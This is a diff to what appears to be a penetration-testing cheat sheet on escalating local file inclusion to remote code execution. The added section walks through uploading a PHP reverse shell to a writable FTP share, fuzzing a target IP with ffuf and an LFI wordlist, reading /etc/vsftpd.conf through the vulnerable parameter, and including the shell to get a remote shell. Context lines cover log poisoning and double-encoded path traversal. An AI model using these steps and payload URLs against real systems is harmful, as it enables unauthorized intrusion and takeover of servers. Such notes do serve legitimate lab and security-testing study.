@@ -2,6 +2,8 @@
 
 If you locate an LFI, first try to get RCE.
 
+## Log Poisoning
+
 ### 1) Locate a writable log file
 
     /var/log/apache2/access.log
@@ -63,3 +65,29 @@ or
 Try Double-encoding: 
 
 URL-encode twice if the app decodes input more than once (example: %252e%252e%252f = %2e%2e%2f).
+
+## LFI to RCE by calling your uploaded reverse shell
+
+If you have write access on an FTP server, you can upload your reverse shell, then call it with LFI to catch it.
+
+### 1) Upload your reverse shell in a writable FTP share
+
+    put php-reverse-shell.php
+
+### 2) Using LFI, find the FTP configuration file to detect the share that your shell is uploaded.
+
+Enumerate with ffuf
+
+    ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt -t 100 -u http://192.168.158.14/secret_information/?lang=FUZZ -fs 146
+
+Read FTP configuration file
+
+    http://domain.local/vulnerable.php?lang=/etc/vsftpd.conf
+
+You might detect something like
+
+    anon_root=/var/ftp write_enable=YES (If anonymous access is allowed for example.)
+
+### 3) Enjoy your shell
+
+    http://domain.local/vulnerable.php?lang=/var/ftp/pub/php-reverse-shell.php
